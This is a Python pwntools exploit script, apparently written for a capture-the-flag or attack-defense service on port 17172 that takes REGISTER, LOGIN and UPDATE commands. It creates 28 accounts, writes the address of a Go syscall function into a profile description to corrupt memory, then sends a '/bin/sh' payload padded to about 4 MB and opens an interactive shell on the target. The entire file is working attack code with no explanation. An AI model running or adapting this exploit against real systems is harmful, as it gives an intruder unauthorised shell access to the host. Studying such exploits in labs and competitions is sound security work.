#!/usr/bin/env python3

import sys

import pwn


def register(io: pwn.tube, username: bytes, password: bytes, protection: bytes) -> None:
    io.sendlineafter(b'> ', b'REGISTER')

    io.sendlineafter(b': ', username)
    io.sendlineafter(b': ', password)
    io.sendlineafter(b': ', protection)

    return


def login(io: pwn.tube, username: bytes, password: bytes) -> None:
    io.sendlineafter(b'> ', b'LOGIN')

    io.sendlineafter(b': ', username)
    io.sendlineafter(b': ', password)

    return


def info(io: pwn.tube) -> bytes:
    io.sendlineafter(b'> ', b'INFO')

    return io.recvline()[4:]


def update(io: pwn.tube, description: bytes) -> None:
    io.sendlineafter(b'> ', b'UPDATE')

    io.sendlineafter(b': ', description)

    return


def logout(io: pwn.tube) -> None:
    io.sendlineafter(b'> ', b'LOGOUT')

    return


def exit(io: pwn.tube) -> None:
    io.sendlineafter(b'> ', b'EXIT')

    return


def main() -> None:
    IP = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
    PORT = 17172

    io = pwn.remote(IP, PORT)

    # 0000000000402680 T syscall.RawSyscall6

    for i in range(28):
        register(io, f'x_{i}'.encode(), b'x', b'full')
        logout(io)

    register(io, b'x', b'x', b'full')
    update(io, pwn.p64(0x0000000000402680) + pwn.p64(0))
    logout(io)
    login(io, b'x', b'x')
    logout(io)

    # pwn.pause()

    payload = b'/bin/sh\x00'
    payload += b'A' * (0x400008 - len(payload))

    register(io, payload, b'y', b'full')

    io.interactive()


if __name__ == '__main__':
    main()
